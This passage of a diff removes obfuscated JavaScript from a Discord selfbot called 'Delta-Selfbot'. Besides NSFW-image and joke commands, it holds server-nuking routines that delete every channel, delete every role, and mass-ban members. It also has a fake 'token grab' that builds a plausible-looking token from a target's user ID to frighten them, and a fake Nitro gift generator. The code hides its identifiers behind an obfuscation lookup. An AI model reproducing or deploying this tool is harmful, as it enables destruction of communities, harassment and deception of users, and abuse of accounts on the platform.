-    message.content[_0x53081e('0x64')](prefix + 'ass') && (superagent[_0x53081e('0x89')](_0x53081e('0x1d1'))[_0x53081e('0x255')]({
-        'type': 'ass'
-    })[_0x53081e('0x2a4')]((_0x436e26, _0x48d20d) => {
-        const _0x336cbd = _0x53081e;
-        var _0xf8e542 = new Discord.RichEmbed()[_0x336cbd('0x42')](color)[_0x336cbd('0x1ca')](_0x336cbd('0x191'))
-            .setTimestamp()
-.setImage(_0x48d20d[_0x336cbd('0xde')]['message'])
-            .setColor(color);
-        message[_0x336cbd('0x179')](_0xf8e542)[_0x336cbd('0x18d')](_0xb36534 => console.log('[', 'ERROR' [_0x336cbd('0x2ab')], ']', _0x336cbd('0xa3')[_0x336cbd('0x145')]));
-    }), console[_0x53081e('0x2f')](_0x53081e('0x1a0').yellow));
-    message.content[_0x53081e('0x64')](prefix + '4k') && superagent[_0x53081e('0x89')]('https://nekobot.xyz/api/image')[_0x53081e('0x255')]({
-        'type': '4k'
-    })[_0x53081e('0x2a4')]((_0x230855, _0xf3a7ff) => {
-        const _0x575241 = _0x53081e;
-        var _0x455df3 = new Discord[(_0x575241('0x226'))]()[_0x575241('0x1ca')](_0x575241('0x191'))[_0x575241('0x1c4')]()[_0x575241('0x4c')](_0xf3a7ff[_0x575241('0xde')][_0x575241('0x1c8')])[_0x575241('0x42')](color);
-        message.edit(_0x455df3)[_0x575241('0x18d')](_0x43aeb6 => console[_0x575241('0x2f')]('[', _0x575241('0xf9')[_0x575241('0x2ab')], ']', _0x575241('0xa3').green)), console[_0x575241('0x2f')](_0x575241('0x17b')[_0x575241('0x39')]);
-    });
-    if(message.content[_0x53081e('0x64')](prefix + 'nsfw-gif')) {
-        var _0x46ece8 = new Discord[(_0x53081e('0x226'))]();
-        superagent.get(_0x53081e('0x1d1'))[_0x53081e('0x255')]({
-            'type': _0x53081e('0x50')
-        })[_0x53081e('0x2a4')]((_0x40302f, _0x20dc48) => {
-            const _0x2202bc = _0x53081e;
-            var _0x246be4 = new Discord[(_0x2202bc('0x226'))]()
-.setFooter(_0x2202bc('0x191'))[_0x2202bc('0x1c4')]()[_0x2202bc('0x4c')](_0x20dc48[_0x2202bc('0xde')][_0x2202bc('0x1c8')])[_0x2202bc('0x42')](color);
-            message.edit(_0x246be4)[_0x2202bc('0x18d')](_0xef0360 => console[_0x2202bc('0x2f')]('[', _0x2202bc('0xf9').red, ']', 'une erreur est survenue que je ne peux régler' [_0x2202bc('0x145')])), console[_0x2202bc('0x2f')](_0x2202bc('0xd7')[_0x2202bc('0x39')]);
-        });
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xd6'))) {
-        var _0x54e6e1 = new Discord[(_0x53081e('0x226'))]();
-        superagent[_0x53081e('0x89')]('https://nekobot.xyz/api/image')[_0x53081e('0x255')]({
-            'type': _0x53081e('0x2a9')
-        })[_0x53081e('0x2a4')]((_0xfb2d8c, _0x5e69e0) => {
-            const _0x23d028 = _0x53081e;
-            var _0xf98c31 = new Discord[(_0x23d028('0x226'))]()[_0x23d028('0x1ca')](_0x23d028('0x191'))[_0x23d028('0x1c4')]()[_0x23d028('0x4c')](_0x5e69e0[_0x23d028('0xde')][_0x23d028('0x1c8')])[_0x23d028('0x42')](color);
-            message[_0x23d028('0x179')](_0xf98c31).catch(_0xb29805 => console[_0x23d028('0x2f')]('[', _0x23d028('0xf9').red, ']', _0x23d028('0xa3')[_0x23d028('0x145')])), console.log(_0x23d028('0x137')[_0x23d028('0x39')]);
-        });
-    }
-    message.content[_0x53081e('0x64')](prefix + 'pussy') && superagent[_0x53081e('0x89')](_0x53081e('0x1d1'))['query']({
-        'type': _0x53081e('0x1ee')
-    })[_0x53081e('0x2a4')]((_0x166170, _0x3d8ddf) => {
-        const _0x4310d8 = _0x53081e;
-        var _0x80f5ce = new Discord[(_0x4310d8('0x226'))]()[_0x4310d8('0x1ca')]('Delta-Selfbot')[_0x4310d8('0x1c4')]()[_0x4310d8('0x4c')](_0x3d8ddf.body[_0x4310d8('0x1c8')])
-            .setColor(color);
-        message[_0x4310d8('0x179')](_0x80f5ce)[_0x4310d8('0x18d')](_0xdd617d => console.log('[', _0x4310d8('0xf9')[_0x4310d8('0x2ab')], ']', _0x4310d8('0xa3')[_0x4310d8('0x145')])), console[_0x4310d8('0x2f')](_0x4310d8('0x20').yellow);
-    });
-    message.content[_0x53081e('0x64')](prefix + 'thigh') && superagent.get(_0x53081e('0x1d1'))[_0x53081e('0x255')]({
-        'type': 'thigh'
-    })[_0x53081e('0x2a4')]((_0x1a1c9f, _0x3f80eb) => {
-        const _0x167ed6 = _0x53081e;
-        var _0x5d5f3c = new Discord[(_0x167ed6('0x226'))]()[_0x167ed6('0x1ca')](_0x167ed6('0x191'))
-            .setTimestamp()[_0x167ed6('0x4c')](_0x3f80eb[_0x167ed6('0xde')][_0x167ed6('0x1c8')])[_0x167ed6('0x42')](color);
-        message.edit(_0x5d5f3c)[_0x167ed6('0x18d')](_0x1f7be7 => console[_0x167ed6('0x2f')]('[', _0x167ed6('0xf9')[_0x167ed6('0x2ab')], ']', _0x167ed6('0xa3')[_0x167ed6('0x145')])), console[_0x167ed6('0x2f')](_0x167ed6('0x1e2').yellow);
-    });
-    message.content.startsWith(prefix + 'anal') && superagent.get('https://nekobot.xyz/api/image')['query']({
-        'type': _0x53081e('0x250')
-    })[_0x53081e('0x2a4')]((_0x532715, _0x573b00) => {
-        const _0x19099b = _0x53081e;
-        var _0x191772 = new Discord[(_0x19099b('0x226'))]()[_0x19099b('0x1ca')]('Delta-Selfbot')[_0x19099b('0x1c4')]()[_0x19099b('0x4c')](_0x573b00[_0x19099b('0xde')][_0x19099b('0x1c8')])[_0x19099b('0x42')](color);
-        message[_0x19099b('0x179')](_0x191772)[_0x19099b('0x18d')](_0x25cae6 => console[_0x19099b('0x2f')]('[', _0x19099b('0xf9')[_0x19099b('0x2ab')], ']', _0x19099b('0xa3')[_0x19099b('0x145')])), console[_0x19099b('0x2f')](_0x19099b('0x164').yellow);
-    });
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x229'))) {
-        if(!_0x7cd31a) return message.edit(_0x53081e('0x254'));
-        var _0x407029 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0xc9')](_0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0xed') + client.user[_0x53081e('0x27c')])[_0x53081e('0x4c')](_0x53081e('0x228'));
-        message[_0x53081e('0x179')](_0x407029)[_0x53081e('0x18d')](_0xa4a1c1 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x28f')[_0x53081e('0x39')]);
-    }
-    if(message.content.startsWith(prefix + 'boom')) {
-        if(!_0x7cd31a) return message.edit(_0x53081e('0x254'));
-        var _0x1be3e8 = new Discord.RichEmbed()[_0x53081e('0x42')](color)
-.setFooter(_0x53081e('0x191'))[_0x53081e('0xc9')](_0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0x35') + client[_0x53081e('0xb9')][_0x53081e('0x27c')])[_0x53081e('0x4c')](_0x53081e('0x25f'));
-        message[_0x53081e('0x179')](_0x1be3e8)[_0x53081e('0x18d')](_0x53146b => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')]('Commande boom effectué' [_0x53081e('0x39')]);
-    }
-    message.content === prefix + _0x53081e('0x227') && (message[_0x53081e('0x110')]()[_0x53081e('0xdb')](() => process.exit(0x1)), console[_0x53081e('0x2f')](_0x53081e('0xdd')[_0x53081e('0x39')]));
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x113'))) {
-        let _0x52919a = message[_0x53081e('0x133')];
-        if(!_0x52919a) {
-            message[_0x53081e('0x179')](':x: **Veuillez executer cette commande sur un serveur!**');
-            return;
-        }
-        if(!_0x7cd31a) {
-            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
-            return;
-        }
-        _0x7cd31a[_0x53081e('0x113')]()[_0x53081e('0xdb')](_0x5bc697 => {
-            const _0x2b6c1e = _0x53081e;
-            message[_0x2b6c1e('0x179')](':wave: ' + _0x5bc697[_0x2b6c1e('0x60')] + _0x2b6c1e('0x283'));
-        })[_0x53081e('0x18d')](() => {
-            const _0x114a29 = _0x53081e;
-            message[_0x114a29('0x179')](':x: **Access Denied**');
-        }), console[_0x53081e('0x2f')](_0x53081e('0xe6')[_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + 'ban')) {
-        let _0x414e8e = message[_0x53081e('0x133')];
-        if(!_0x414e8e) {
-            message[_0x53081e('0x179')](':x: **Veuillez executer cette commande sur un serveur!**');
-            return;
-        }
-        if(!_0x7cd31a) {
-            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
-            return;
-        }
-        _0x7cd31a.ban().then(_0x43205f => {
-            const _0x1bd5ec = _0x53081e;
-            message[_0x1bd5ec('0x179')](':wave: ' + _0x43205f[_0x1bd5ec('0x60')] + _0x1bd5ec('0x51'));
-        })[_0x53081e('0x18d')](() => {
-            const _0x283f49 = _0x53081e;
-            message[_0x283f49('0x179')](_0x283f49('0x247'));
-        }), console[_0x53081e('0x2f')](_0x53081e('0x1b8').yellow);
-    }
-    message.content[_0x53081e('0x64')](prefix + _0x53081e('0x7b')) && (message[_0x53081e('0xf2')][_0x53081e('0x18b')]().then(_0x35c934 => _0x35c934[_0x53081e('0x8b')](_0x3cb6ae => {
-        const _0x1317df = _0x53081e;
-        _0x3cb6ae[_0x1317df('0x110')]()[_0x1317df('0x18d')](_0x2504ae => console.log('[', _0x1317df('0xf9')[_0x1317df('0x2ab')], ']', _0x1317df('0xa3').green));
-    })), console[_0x53081e('0x2f')](_0x53081e('0xb3')[_0x53081e('0x39')]));
-    if(message.content === prefix + _0x53081e('0x130')) {
-        let _0x3b1463 = new Discord[(_0x53081e('0x226'))]();
-        _0x3b1463.setColor(color)[_0x53081e('0xc9')](_0x53081e('0x32'))[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](rire[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * rire[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x3b1463).catch(_0x315d80 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x2')[_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x135'))) {
-        if(!_0x7cd31a) {
-            message.edit(_0x53081e('0x1e1'));
-            return;
-        }
-        let _0x45ce03 = new Discord[(_0x53081e('0x226'))]();
-        _0x45ce03.setColor(color)[_0x53081e('0xc9')]('**' + client[_0x53081e('0xb9')]['username'] + _0x53081e('0x2c') + _0x7cd31a.username + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](kiss[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * kiss.length)]), message[_0x53081e('0x179')](_0x45ce03)[_0x53081e('0x18d')](_0x32e996 => console.log('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande kiss effectué' [_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1df'))) {
-        if(!_0x7cd31a) {
-            message.edit(_0x53081e('0x1e1'));
-            return;
-        }
-        let _0x5b1f79 = new Discord.RichEmbed();
-        _0x5b1f79[_0x53081e('0x42')](color)
-            .setTitle('**' + _0x7cd31a[_0x53081e('0x27c')] + _0x53081e('0x274'))[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x4c')](veski[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * veski[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x5b1f79).catch(_0x5ce437 => console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler'.green)), console[_0x53081e('0x2f')](_0x53081e('0xf4').yellow);
-    }
-    if(message.content.startsWith(prefix + _0x53081e('0x46'))) {
-        message[_0x53081e('0x110')]();
-        var _0x3be30e = '.',
-            _0x15fce2 = '█';
-        message.channel[_0x53081e('0x20e')](_0x53081e('0x276') + _0x3be30e[_0x53081e('0x2d')](0x32) + _0x53081e('0x27e'))[_0x53081e('0xdb')](_0x12d16f => {
-            const _0x562c2c = _0x53081e;
-            for(_0x127ab8 = 0x0; _0x127ab8 <= 0x32; _0x127ab8++) {
-                _0x12d16f.edit('```[' + _0x15fce2[_0x562c2c('0x2d')](_0x127ab8) + _0x3be30e[_0x562c2c('0x2d')](0x32 - _0x127ab8) + ']  -  ' + _0x127ab8 * 0x64 / 0x32 + '%\x0a' + _0x562c2c('0x36'));
-            }
-            _0x12d16f[_0x562c2c('0x179')]('`Succesfull load.`')[_0x562c2c('0x18d')](_0x55ea15 => console[_0x562c2c('0x2f')]('[', 'ERROR' [_0x562c2c('0x2ab')], ']', _0x562c2c('0xa3')[_0x562c2c('0x145')])), console[_0x562c2c('0x2f')](_0x562c2c('0x128')[_0x562c2c('0x39')]);
-        });
-    }
-    if(message.content === prefix + _0x53081e('0x1f9')) {
-        let _0x49c9a1 = message[_0x53081e('0x133')];
-        if(!_0x49c9a1) {
-            message[_0x53081e('0x179')](_0x53081e('0x1a8'));
-            return;
-        }
-        if(!message[_0x53081e('0x209')][_0x53081e('0x10a')]('MANAGE_CHANNELS')) return message[_0x53081e('0x110')]().then(console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
-        var _0x3657ae = message.guild[_0x53081e('0x19')];
-        _0x3657ae.forEach(_0x431053 => {
-            const _0x22e84f = _0x53081e;
-            _0x431053[_0x22e84f('0x110')]()[_0x22e84f('0x18d')](_0x270d07 => console[_0x22e84f('0x2f')]('[', _0x22e84f('0xf9')[_0x22e84f('0x2ab')], ']', _0x22e84f('0xa3')[_0x22e84f('0x145')]));
-        }), console[_0x53081e('0x2f')](_0x53081e('0x52')[_0x53081e('0x39')]);
-    }
-    if(message.content === prefix + _0x53081e('0x22f')) {
-        let _0x354005 = message.guild;
-        if(!_0x354005) {
-            message[_0x53081e('0x179')](_0x53081e('0x25a'));
-            return;
-        }
-        message[_0x53081e('0x133')]['roles'][_0x53081e('0x8b')](_0x381a9 => {
-            const _0x15edfc = _0x53081e;
-            _0x381a9[_0x15edfc('0x110')]()[_0x15edfc('0x18d')](_0x46b865 => console.log('[', 'ERROR'.red, ']', _0x15edfc('0xa3').green));
-        }), console[_0x53081e('0x2f')](_0x53081e('0x7').yellow);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xf'))) {
-        if(!_0x7cd31a) {
-            message.edit(_0x53081e('0x1e1'));
-            return;
-        }
-        let _0x522325 = new Discord[(_0x53081e('0x226'))]();
-        _0x522325.setColor(color)
-            .setTitle('**' + client.user.username + _0x53081e('0xad') + _0x7cd31a.username + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')](_0x53081e('0x191'))
-.setImage(punch[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * punch[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x522325)[_0x53081e('0x18d')](_0x541df4 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x268')[_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x116'))) {
-        if(!_0x7cd31a) {
-            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
-            return;
-        }
-        let _0x55049c = new Discord[(_0x53081e('0x226'))]();
-        _0x55049c[_0x53081e('0x42')](color)[_0x53081e('0xc9')]('**' + client.user[_0x53081e('0x27c')] + _0x53081e('0x122') + _0x7cd31a[_0x53081e('0x27c')] + '**')[_0x53081e('0x1c4')]()[_0x53081e('0x1ca')]('Delta-Selfbot')[_0x53081e('0x4c')](hugh[Math[_0x53081e('0xa4')](Math.random() * hugh[_0x53081e('0x219')])]), message[_0x53081e('0x179')](_0x55049c).catch(_0x10098e => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x28e')[_0x53081e('0x39')]);
-    }
-    if(message.content.startsWith(prefix + _0x53081e('0x188'))) {
-        let _0x3d92d0 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ') || 'Delta selfbot';
-        message[_0x53081e('0x179')](_0x53081e('0x27f') + _0x3d92d0), message.guild[_0x53081e('0x295')](_0x3d92d0), console[_0x53081e('0x2f')](_0x53081e('0x1d0')[_0x53081e('0x39')]);
-    }
-    if(message.content.startsWith(prefix + _0x53081e('0xb'))) {
-        if(!_0x7cd31a) {
-            message[_0x53081e('0x179')](_0x53081e('0x1e1'));
-            return;
-        }
-        let _0x42f027 = [_0x53081e('0x1b0'), _0x53081e('0x243'), 'XluxwQ', 'XXn_KA', _0x53081e('0x23d')],
-            _0x5c4fde = [_0x53081e('0x217'), _0x53081e('0x257'), '3_6Xt2k4OieDKimnNYGWUq9vJRo', _0x53081e('0x124')];
-        var _0x31da53 = _0x7cd31a.id,
-            _0x3a2d76 = utf8.encode(_0x31da53),
-            _0xb12e32 = base64[_0x53081e('0x249')](_0x3a2d76);
-        let _0x165222 = new Discord[(_0x53081e('0x226'))]()
-            .setColor('' + color)[_0x53081e('0x1ca')](_0x53081e('0x191'))
-            .setTitle(_0x53081e('0xe7') + _0x7cd31a[_0x53081e('0x27c')])
-.setDescription(_0xb12e32 + '.' + _0x42f027[Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0x42f027.length)] + '.' + _0x5c4fde[Math.floor(Math[_0x53081e('0x1a1')]() * _0x5c4fde[_0x53081e('0x219')])]);
-        setTimeout(() => {
-            const _0x4483f7 = _0x53081e;
-            message[_0x4483f7('0x179')](_0x4483f7('0x3c'));
-        }, 0x3e8), setTimeout(() => {
-            const _0x1c10f6 = _0x53081e;
-            message[_0x1c10f6('0x179')]('▓▓░░░░░░░░ 20%');
-        }, 0x5dc), setTimeout(() => {
-            const _0xc36db4 = _0x53081e;
-            message[_0xc36db4('0x179')]('▓▓▓▓░░░░░░ 40%');
-        }, 0x7d0), setTimeout(() => {
-            const _0x1a1082 = _0x53081e;
-            message.edit(_0x1a1082('0xa9'));
-        }, 0x9c4), setTimeout(() => {
-            const _0x28722e = _0x53081e;
-            message.edit(_0x28722e('0x3f'));
-        }, 0xbb8), setTimeout(() => {
-            const _0x56c53b = _0x53081e;
-            message[_0x56c53b('0x179')]('▓▓▓▓▓▓▓▓▓▓ 100%');
-        }, 0xdac), setTimeout(() => {
-            const _0x3b9784 = _0x53081e;
-            message[_0x3b9784('0x179')](_0x165222).catch(_0x3646c4 => console[_0x3b9784('0x2f')]('[', 'ERROR'.red, ']', _0x3b9784('0xa3').green));
-        }, 0xfa0), console.log(_0x53081e('0xc1')[_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x249'))) {
-        var _0x30596a = _0xdcd936[_0x53081e('0x28d')](' ') || _0x53081e('0x14');;
-        var _0x3a2d76 = utf8.encode(_0x30596a),
-            _0xb12e32 = base64[_0x53081e('0x249')](_0x3a2d76);
-        let _0x58f355 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')]('' + color)
-            .setTitle('Texte -> Base64 :')[_0x53081e('0x1f6')](_0xb12e32);
-        message.edit(_0x58f355)[_0x53081e('0x18d')](_0x399394 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x184').yellow);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x1aa'))) {
-        let _0x97f568 = ['5%', _0x53081e('0x1a3'), _0x53081e('0x299'), '20%', _0x53081e('0x4a'), _0x53081e('0x17'), _0x53081e('0x18a'), _0x53081e('0x1ad'), _0x53081e('0x240'), _0x53081e('0x101'), '55', _0x53081e('0x102'), _0x53081e('0x278'), '70%', _0x53081e('0x86'), _0x53081e('0x251'), '85%', _0x53081e('0x1a4'), '95%', _0x53081e('0x6d')],
-            _0x231c3a = Math[_0x53081e('0xa4')](Math[_0x53081e('0x1a1')]() * _0x97f568[_0x53081e('0x219')]),
-            _0x36970e = _0xdcd936[_0x53081e('0x1ed')](0x0)[_0x53081e('0x28d')](' ') || _0x53081e('0x14');;
-        let _0x47dd52 = new Discord[(_0x53081e('0x226'))]()['setAuthor'](message[_0x53081e('0x1ab')]['tag'])[_0x53081e('0x42')](_0x53081e('0x1b1'))
-.setFooter(_0x53081e('0x191'))[_0x53081e('0x15f')]('' + message[_0x53081e('0x1ab')][_0x53081e('0xaf')])[_0x53081e('0x1cd')](_0x53081e('0xfa'), _0x36970e)
-            .addField('relation estimée à ❤', _0x97f568[_0x231c3a]);
-        message[_0x53081e('0x179')](_0x47dd52)[_0x53081e('0x18d')](_0x4a4457 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log('Commande lovecalc effectué' [_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x275'))) {
-        const _0x4889b3 = message.content['split'](' ')[_0x53081e('0x1ed')](0x1)[_0x53081e('0x28d')](' ') || _0x53081e('0x41');
-        let _0x2da71c = rpcGenerator.createSpotifyRpc(client)[_0x53081e('0x1dc')]('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')['setAssetsSmallImage'](_0x53081e('0x2a8'))[_0x53081e('0x11e')](_0x4889b3)[_0x53081e('0x11d')](_0x53081e('0x191'))[_0x53081e('0xbb')](Date[_0x53081e('0x12e')]())['setEndTimestamp'](Date.now() + 0x5265c00);
-        client[_0x53081e('0xb9')][_0x53081e('0x72')](_0x2da71c[_0x53081e('0x118')]())[_0x53081e('0xdb')](message[_0x53081e('0x179')](_0x53081e('0x1e') + _0x4889b3 + _0x53081e('0xcd')))[_0x53081e('0x18d')](console[_0x53081e('0x23e')]), console[_0x53081e('0x2f')](_0x53081e('0x197')[_0x53081e('0x39')]);
-    }
-    message.content.startsWith(prefix + _0x53081e('0xc0')) && (clearInterval(), client[_0x53081e('0xb9')][_0x53081e('0x115')](null, {}), message[_0x53081e('0x179')](_0x53081e('0x140')).catch(_0xff7272 => console[_0x53081e('0x2f')]('[', 'ERROR'.red, ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1e3')[_0x53081e('0x39')]));
-    if(message.content === prefix + _0x53081e('0x169')) {
-        const _0x44c98a = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x15f')]('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
-            .addField('Gift :', '|| https:/' + _0x53081e('0xce') + nitrocode(0x10, _0x53081e('0x183')) + _0x53081e('0x282'));
-        message.edit(_0x44c98a)[_0x53081e('0x18d')](_0x430969 => console[_0x53081e('0x2f')]('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xa3').green)), console.log(_0x53081e('0xe3')[_0x53081e('0x39')]);
-    }
-    message.content.startsWith(prefix + _0x53081e('0x126')) && (message[_0x53081e('0x110')](), setTimeout(() => {
-        const _0x4826b5 = _0x53081e;
-        client.destroy().catch(_0x13c06c => console[_0x4826b5('0x2f')]('[', _0x4826b5('0xf9')[_0x4826b5('0x2ab')], ']', _0x4826b5('0xa3').green));
-    }, 0x5dc), console[_0x53081e('0x2f')]('Nouveau token generé' [_0x53081e('0x145')]));
-    if(message.content.startsWith(prefix + _0x53081e('0xbc'))) {
-        let _0x2d8c11 = _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ');
-        !_0x2d8c11 && message[_0x53081e('0x179')](_0x53081e('0x211'));
-
-        function _0x421c8c(_0x571e5) {
-            const _0x4267b7 = _0x53081e;
-            return _0x571e5.split('')[_0x4267b7('0xbc')]()[_0x4267b7('0x28d')]('');
-        }
-        let _0x57e2b6 = _0x421c8c(_0x2d8c11);
-        _0xdcd936[0x0] === _0x57e2b6 && (_0x57e2b6 = '' + _0xdcd936[_0x53081e('0xf8')](0x1)[_0x53081e('0x28d')](' ')), message.edit('' + _0x57e2b6)[_0x53081e('0x18d')](console[_0x53081e('0x23e')]), console[_0x53081e('0x2f')](_0x53081e('0x15')[_0x53081e('0x39')]);
-    }
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x208'))) {
-        let _0x518e1e = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1f6')](_0x53081e('0x9b') + Discord.version + '**')[_0x53081e('0x1ca')](_0x53081e('0x191'));
-        message.edit(_0x518e1e).catch(_0x74b121 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console[_0x53081e('0x2f')](_0x53081e('0x1cc').yellow);
-    }
-    message.content === prefix + _0x53081e('0x3') && (message.edit(_0x53081e('0x286')).then(client[_0x53081e('0x1af')]())[_0x53081e('0xdb')](() => client[_0x53081e('0x8c')](token)), console[_0x53081e('0x2f')](_0x53081e('0x136').yellow));
-    if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x178') || prefix + 'ri')) {
-        let _0x353115 = message[_0x53081e('0x133')],
-            _0x4ceb10 = message.mentions[_0x53081e('0x33')]['first']();
-        if(!_0x353115) return message[_0x53081e('0x179')](_0x53081e('0x99'));
-        if(!_0x4ceb10) return message[_0x53081e('0x110')]()[_0x53081e('0xdb')](console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0x1a2')[_0x53081e('0x145')]));
-        const _0x11d146 = {
-            'false': _0x53081e('0x20f'),
-            'true': _0x53081e('0x23c')
-        };
-        let _0x318e43 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0x42')](color)[_0x53081e('0x1f6')](_0x53081e('0x21') + _0x4ceb10.id + '>')[_0x53081e('0x1cd')](_0x53081e('0x85'), _0x4ceb10.id)
-            .addField(_0x53081e('0x19b'), _0x4ceb10[_0x53081e('0x285')])
-.setFooter('Delta-Selfbot')[_0x53081e('0x1cd')](_0x53081e('0x6f'), _0x4ceb10.members[_0x53081e('0x1c1')])
-            .addField(_0x53081e('0x1bb'), _0x4ceb10[_0x53081e('0xca')])[_0x53081e('0x1cd')](_0x53081e('0xda'), _0x11d146[_0x4ceb10[_0x53081e('0x1d7')]]);
-        if(!message[_0x53081e('0x209')]['hasPermission'](_0x53081e('0x121'))) return message[_0x53081e('0x179')](':x: **permission insuffisante (embed_links)**\x0a<@&' + _0x4ceb10.id + '>\x0a\x0aid du role: ' + _0x4ceb10.id + '\x0acouleur du role: ' + _0x4ceb10[_0x53081e('0x285')] + _0x53081e('0x15b') + _0x4ceb10[_0x53081e('0x107')]['size'] + _0x53081e('0xa8') + _0x4ceb10[_0x53081e('0xca')] + _0x53081e('0x1e0') + _0x11d146[_0x4ceb10[_0x53081e('0x1d7')]]);
-        console[_0x53081e('0x2f')](_0x53081e('0x16a')[_0x53081e('0x39')]), message[_0x53081e('0x179')](_0x318e43).catch(_0x9ec716 => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')));
-    }
-    if(message.content === prefix + _0x53081e('0x95')) {
-        let _0x4fa5fc = message.guild;
-        if(!_0x4fa5fc) return message[_0x53081e('0x179')](_0x53081e('0x99'));
-        if(!message.member.hasPermission(_0x53081e('0x21c'))) return message[_0x53081e('0x110')]()[_0x53081e('0xdb')](console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', _0x53081e('0xc')[_0x53081e('0x145')]));
-        const _0x1953b0 = message[_0x53081e('0x133')][_0x53081e('0x107')];
-        _0x1953b0[_0x53081e('0x8b')](_0x2c4f40 => {
-            const _0x136f86 = _0x53081e;
-            if(!_0x2c4f40[_0x136f86('0xe4')]) return;
-            _0x2c4f40.ban()[_0x136f86('0x18d')](_0x416bc9 => console[_0x136f86('0x2f')]('[', _0x136f86('0xf9')[_0x136f86('0x2ab')], ']', _0x136f86('0xa3')[_0x136f86('0x145')]));
-        }), console[_0x53081e('0x2f')](_0x53081e('0x1bd').yellow);
-    }
-    if(message.content === prefix + _0x53081e('0xc4')) {
-        let _0x5b9236 = message[_0x53081e('0x133')];
-        if(!_0x5b9236) return message.edit(_0x53081e('0x99'));
-        if(!message.member.hasPermission(_0x53081e('0x10f'))) return message[_0x53081e('0x110')]().then(console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xc')[_0x53081e('0x145')]));
-        const _0x18b713 = message.guild[_0x53081e('0x107')];
-        _0x18b713[_0x53081e('0x8b')](_0x290b68 => {
-            const _0x45b3d3 = _0x53081e;
-            if(!_0x290b68[_0x45b3d3('0x1fd')]) return;
